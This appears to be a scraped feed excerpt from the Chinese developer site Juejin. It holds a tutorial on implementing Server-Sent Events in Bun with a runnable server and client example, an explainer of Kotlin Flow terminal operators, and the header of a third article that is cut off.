            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3872909003334776/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    JohnYan
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T04:17:33.000Z" title="Fri Nov 21 2025 04:17:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">概述</h2>
<p>本文是笔者的系列博文 <a href="https://juejin.cn/post/7509869950305501235" target="_blank" title="https://juejin.cn/post/7509869950305501235">《Bun技术评估》</a> 中的第二十九篇。</p>
<p>在本文的内容中，笔者主要想要来探讨一下Bun中和SSE(服务器端消息)集成开发相关的问题。</p>
<p>关于SSE，笔者其实已经有几篇博文有所涉及，自认为已经解析的非常清晰了。所以本文主要讨论的内容并不是关于这个概念和技术，而是展示一下其在Bun开发中的实现。</p>
<p>如果关于这个技术读者想要进一步了解，可以参考下面这几篇相关博文：</p>
<p><a href="https://juejin.cn/post/7382044195533406247" target="_blank" title="https://juejin.cn/post/7382044195533406247">《Nodejs开发进阶S-WebSocket和SSE》</a></p>
<p><a href="https://juejin.cn/post/7380222254195703820" target="_blank" title="https://juejin.cn/post/7380222254195703820">《基于SSE的服务集群状态和数据同步》</a></p>
<p><a href="https://juejin.cn/post/7313841072228581387" target="_blank" title="https://juejin.cn/post/7313841072228581387">《Nodejs SSE示例代码和解析》</a></p>
<h2 data-id="heading-1">Bun实现重点</h2>
<p>SSE本质上而言，就是一个HTTP协议的扩展应用，所以理论上，任何完整实现HTTP协议的技术和框架，都可以改进成为支持SSE。笔者简单的总结了一下，只需要注意以下几个问题：</p>
<ul>
<li>请求响应时，服务器的响应头有特殊的内容,包括</li>
<li>content-type: text/event-stream</li>
<li>connection: keep-alive</li>
<li>响应的实际内容，应该是一个文本流，但SSE有一定的规范比如使用"\n\n"消息结束字符</li>
<li>理论上开发者可以自定义任意的消息格式和处理方式</li>
<li>所以，在服务端和客户端都需要有内容流的处理机制</li>
<li>服务端需要有多个客户端的管理机制，这和普通HTTP请求响应处理有很大区别，和WS类似</li>
<li>和WS相比巨大的优势就是HTTP协议的内置支持，无需协议升级，网络环境兼容性更好；问题是半双工的工作模式；适合特定的应用场景</li>
</ul>
<p>其实，理解了以上技术内核，在Bun中，实现SSE是非常简单的。下面就是笔者编写的示例代码，可以单文件执行和测试。</p>
<h2 data-id="heading-2">实现代码和解析</h2>
<p>相关的参考示例代码如下：</p>
<pre><code class="hljs language-sse.ts" lang="sse.ts">
const
EventEmitter = require('events'),
EM_PUSH = new EventEmitter(),
SSE_DATA = "data: ",
SSE_END  = "\n\n",
EV_HEADER = {
    "Access-Control-Allow-Origin": "*",
    "Content-Type": "text/event-stream",
    "Cache-Control": "no-cache",
    "Connection": "keep-alive",
};

const 
PORT = 7085,
HOST = "0.0.0.0",
PATH_SSE = "/sse/:clientid";

const CLIENTS = [];
const onAbort = (ctrLer)=&gt;{
    const index = CLIENTS.indexOf(ctrLer);
    if (index &gt; -1) CLIENTS.splice(index, 1);
};

const pushHandle = (req)=&gt;{
    const  clientid = req.params.clientid;
        // 2. 创建事件流
    const stream = new ReadableStream({
        start(controller) {
            controller.clientid = clientid;
            // 3. 将新客户端的控制器存入全局数组
            CLIENTS.push(controller);

            const encoder = new TextEncoder();

            // 可选：立即发送一条欢迎消息或初始数据
            controller.enqueue(encoder.encode( " Welcome : client : " + clientid + SSE_END));

            // 4. 当客户端关闭连接时，将其从数组中移除
            req.signal.addEventListener("abort", ()=&gt;onAbort(controller));
        },
    });

    return new Response(stream, { headers: EV_HEADER });
}

const routes = {
    [PATH_SSE] : pushHandle
};

const start=(port = 7085, hostname="0.0.0.0")=&gt;{
    const server = Bun.serve({ port, hostname, 
        routes, 
        fetch: (req) =&gt; new Response("Not Found: "+ req.url, { status:  404 }), 
        development: true 
    });

    console.log(`Server running at http://${server.hostname}:${server.port}`);
    console.log("Routes: \n", Object.keys(routes).join(" \n"));

    // start push
    // const encoder = 
    EM_PUSH.on("idxData", (data)=&gt;{
        CLIENTS.forEach(c =&gt; {
            c.enqueue(new TextEncoder().encode(SSE_DATA + data + SSE_END));
        });
    });

    setInterval(()=&gt; EM_PUSH.emit("idxData", "somekey"+ Math.random().toString().slice(-4) +":"+ "someValue"), 2000);
}; start(PORT, HOST);

const clientStart = async ()=&gt;{
    const abortController = new AbortController();
    const url = `http://localhost:${PORT}${PATH_SSE.replace(":clientid",Math.random().toString(36).slice(-8) )}`;
    const headers = {
        'Accept': 'text/event-stream',
        'Cache-Control': 'no-cache'
    };

    try {
        console.log("request:", url);
        // 2. 发起fetch请求，注意设置Accept头部和signal
        const res = await fetch(url, { 
            method: "GET",
            headers, 
            signal: abortController.signal 
        });// 关联中止信号
        
        if (!res.ok) {
            console.log("Error", res.status, await res.text() || "Unknow Errorr");
            return;
        }

        // 3. 检查响应内容类型，确保是事件流
        const contentType = res.headers.get('content-type');
        if (!contentType || !contentType.includes('text/event-stream'))  throw new Error(`Expected event-stream content-type, got: ${contentType}`);

        
        // 4. 获取可读流和读取器
        const reader = res.body.getReader();
        const decoder = new TextDecoder();
        let buffer = ''; // 缓冲区，用于处理可能被截断的消息

        // 5. 持续读取流数据
        while (true) {
            const { done, value } = await reader.read();
      
            if (done) break;
            // onComplete?.(); // 流正常结束

            // 6. 将二进制的数据块解码为文本并添加到缓冲区
            buffer += decoder.decode(value, { stream: true });
      
            // 7. 按照SSE协议规范，以两个换行符为分隔符拆分消息
            const messages = buffer.split('\n\n');
            // 最后一个元素可能是半条消息，放回缓冲区等待下次数据
            buffer = messages.pop() || '';

            let mtype,mkey,mvalue;
            for (const message of messages) {
                [mtype, mkey, mvalue] = message.split(":");                
                console.log({mtype, mkey, mvalue});
            }; 
        }
    } catch (error) {
        console.log("Error", error.message);
    }
}; setTimeout(clientStart, 2000);

</code></pre>
<p>执行和效果如下：</p>
<pre><code class="hljs language-css" lang="css">bun <span class="hljs-attr">--watch</span> sse
 
Server running at http://<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">7085</span>
Routes: 
 /sse/:clientid
request: http://localhost:<span class="hljs-number">7085</span>/sse/zq5zvd79
{
  mtype: <span class="hljs-string">" Welcome "</span>,
  mkey: <span class="hljs-string">" client "</span>,
  mvalue: <span class="hljs-string">" zq5zvd79"</span>,
}
{
  mtype: <span class="hljs-string">"data"</span>,
  mkey: <span class="hljs-string">" somekey7556"</span>,
  mvalue: <span class="hljs-string">"someValue"</span>,
}
{
  mtype: <span class="hljs-string">"data"</span>,
  mkey: <span class="hljs-string">" somekey8487"</span>,
  mvalue: <span class="hljs-string">"someValue"</span>,
}
{
  mtype: <span class="hljs-string">"data"</span>,
  mkey: <span class="hljs-string">" somekey7285"</span>,
  mvalue: <span class="hljs-string">"someValue"</span>,
}

</code></pre>
<p>简单说明一下，SSE在Bun的实现原理和一些细节：</p>
<ul>
<li>程序无任何外部依赖，可以独立直接执行</li>
<li>程序分为两个部分，服务端和客户端(用于自测试)，实现了完整的网络应用环境和过程</li>
<li>服务端使用正常方式启动，但为SSE配置相关路由</li>
<li>客户端使用Fetch发起请求，路径为SSE路径，请求方式是标准GET，增加相应头</li>
<li>由于使用标准fetch方法，理论上也可以在浏览器中执行</li>
<li>第一次请求，服务端响应一个数据流，并包括相应的头信息(保存连接和响应类型)</li>
<li>客户端检查响应状态和内容类型(头信息)</li>
<li>客户端通过配置一个读取器(reader)，准备接收数据流</li>
<li>连接建立后，服务端将当前这个连接的控制器，放入客户端列表中</li>
<li>服务端使用一个消息总线(EventEmitter)，接收要发送的消息，并遍历客户端列表发送消息(controller.queue)</li>
<li>消息总线用于解耦SSE服务器和业务应用，业务应用只需要按照业务需求，发送数据到总线即可，不用关心服务器方面的问题</li>
<li>发送的消息是文本消息，具有固定格式，包括类型、键值对和分隔符</li>
<li>客户端持续使用流reader接收消息，并持续处理收到的数据信息</li>
<li>如果发生中断，服务端会清除客户端连接(控制器)</li>
</ul>
<p>后续的增加和改进可以包括：</p>
<ul>
<li>可以在连接创建时，对客户端进行认证满足业务安全需求(此处没有实现)</li>
<li>使用路径，来区分正常请求和SSE请求，甚至支持更多的配置信息，如不同的SSE通道等等</li>
<li>可以附带clientid，然后实现更精准的按需数据推送(已基本实现)</li>
</ul>
<h2 data-id="heading-3">小结</h2>
<p>本文探讨了在Bun中，实现HTTP的SSE特性的相关内容。文中展示了完整的在Bun支持SSE应用的示例代码，包括了服务端的配置和客户端的处理。读者应该可以感受到其实现的简洁和方便。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入理解 Flow 的终端操作符]]></title>    <link>https://juejin.cn/post/7574821757664722985</link>    <guid>https://juejin.cn/post/7574821757664722985</guid>    <pubDate>2025-11-21T04:58:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574821757664722985" data-draft-id="7574722364354199561" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入理解 Flow 的终端操作符 "/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2025-11-21T04:58:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="雨白"/> <meta itemprop="url" content="https://juejin.cn/user/2549135752044601"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入理解 Flow 的终端操作符 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2549135752044601/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    雨白
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T04:58:16.000Z" title="Fri Nov 21 2025 04:58:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>我们来系统学习一下 Flow 的终端操作符。</p>
<p>Flow 是冷流，只有在调用了终端操作符之后，才会启动流的收集流程（<code>collect</code>），上游的代码才会开始执行。</p>
<h2 data-id="heading-0">获取单个元素</h2>
<p>这类操作符用于从流中获取特定的值。</p>
<blockquote>
<p><strong>注意</strong>：它们都是挂起函数。</p>
</blockquote>
<h3 data-id="heading-1">first() 和 firstOrNull()</h3>
<p><code>first()</code>：它会等待并返回 Flow 发射的<strong>第一个</strong>元素，然后立即<strong>取消</strong>流的收集。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Unit</span> = runBlocking {
    <span class="hljs-comment">// 获取第一个值</span>
    <span class="hljs-keyword">val</span> flow = flowOf(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)
    println(<span class="hljs-string">"First value: <span class="hljs-subst">${flow.first()}</span>"</span>) <span class="hljs-comment">// 输出: 1</span>

    <span class="hljs-comment">// 异常：流为空</span>
    <span class="hljs-keyword">val</span> emptyFlow = flowOf&lt;<span class="hljs-built_in">Int</span>&gt;()
    <span class="hljs-keyword">try</span> {
        emptyFlow.first()
    } <span class="hljs-keyword">catch</span> (e: NoSuchElementException) {
        println(<span class="hljs-string">"Error: <span class="hljs-subst">${e.message}</span>"</span>) <span class="hljs-comment">// 输出: Expected at least one element</span>
    }
}
</code></pre>
<p>它的变体是 <code>first{ predicate }</code>，会返回第一个满足条件的元素。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> flow = flowOf(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)
<span class="hljs-comment">// 查找第一个大于等于 2 的元素</span>
<span class="hljs-keyword">val</span> value = flow.first { it &gt;= <span class="hljs-number">2</span> }
</code></pre>
<p><code>firstOrNull()</code> 的行为和 <code>first()</code> 类似，区别在于当 Flow 为空时，它不会抛出异常，而是会返回 <code>null</code>。</p>
<h4 data-id="heading-2">使用场景</h4>
<p>对于不需要持续监听变化的 Flow，我们会经常使用此操作符。</p>
<p>例如：读取 DataStore 的当前快照、将一次性的网络请求封装为 Flow。</p>
<p>读取完毕后，流就会自动关闭，不会造成资源泄漏。</p>
<h3 data-id="heading-3">last() 和 lastOrNull()</h3>
<p>这两个操作符必须等待流完全结束后，才会返回流的最后一个元素。</p>
<p><strong>千万注意</strong>：如果在<strong>无限流</strong>上调用 <code>last()</code>，会导致协程永远<strong>挂起</strong>，进而引出内存泄漏或界面无响应。</p>
<p>无限流场景：</p>
<ul>
<li><code>SharedFlow</code></li>
<li>通过 <code>interval</code> 创建的时间流</li>
<li>Room 数据库的查询 Flow，只要数据表变动，它就会发射新数据，所以它永远不会主动结束。因此，不要在 Dao 返回的 Flow 上调用 <code>last()</code>。</li>
</ul>
<h3 data-id="heading-4">single() 与 singleOrNull()</h3>
<p>这类操作符不仅仅是获取值，还有检验的性质。</p>
<p><code>single()</code>：期待流仅仅发射一个元素。</p>
<ul>
<li>如果流只发射了一个元素，会返回该元素。</li>
<li>如果流为空，会抛出 <code>NoSuchElementException</code>。</li>
<li>如果流的发射了多于一个元素，会抛出 <code>IllegalStateException</code>。</li>
</ul>
<p><code>singleOrNull()</code>：同上，区别在于当流为空或是元素多于一个时，会返回 <code>null</code>。</p>
<p>注意：使用 <code>singleOrNull()</code>，你将无法区分“没有数据”或是“数据超出一个”的情况。如果要区分数据类型，应该使用 <code>single()</code>。</p>
<h2 data-id="heading-5">集合转换与统计</h2>
<p>这类操作符会收集流中的所有数据，需要等待流的结束。所以它也同样存在<strong>无限挂起</strong>的风险。</p>
<h3 data-id="heading-6">count()</h3>
<p>作用：获取流中元素的总个数。</p>
<p>变体：<code>count { predicate }</code> 会统计满足条件的元素个数。</p>
<h3 data-id="heading-7">toList(), toSet(), toCollection()</h3>
<ul>
<li><code>toList()</code>：将所有元素收集到 <code>List</code> 中。</li>
<li><code>toSet()</code>：将所有元素收集到 <code>Set</code> 中。</li>
<li><code>toCollection(destination)</code>：将所有元素添加到指定的集合实例中。</li>
</ul>
<p>注意：Flow 的优势是流式处理，使用这些操作符会将所有数据一次性加载到内存中。如果数据量很大，极易导致 OOM。</p>
<h2 data-id="heading-8">流与通道的桥梁</h2>
<p><code>produceIn(scope)</code> 并不是一个挂起函数，而是一个普通函数。</p>
<p>它可以将一个 <code>Flow</code>（冷流）转为 <code>ReceiveChannel</code>（热通道）。</p>
<p>原理：其实在内部它只是利用传入的 <code>CoroutineScope</code> 启动一个新的协程来收集这个 Flow，并将数据发送到 Channel 中。</p>
<p>在 MVVM 架构中，将冷流转为热流暴露给 UI，我们通常会使用 <code>stateIn</code> 或 <code>shareIn</code>。但在需要利用 <code>Channel</code> 特有的并发能力时，<code>produceIn</code> 还是首选的工具。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[转转UI自动化走查方案探索]]></title>    <link>https://juejin.cn/post/7574739133945675818</link>    <guid>https://juejin.cn/post/7574739133945675818</guid>    <pubDate>2025-11-21T02:34:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7574739133945675818" data-draft-id="7574734686493278244" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="转转UI自动化走查方案探索"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-11-21T02:34:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="转转技术团队"/> <meta itemprop="url" content="https://juejin.cn/user/606586148237431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            转转UI自动化走查方案探索
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/606586148237431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    转转技术团队
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-21T02:34:49.000Z" title="Fri Nov 21 2025 02:34:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
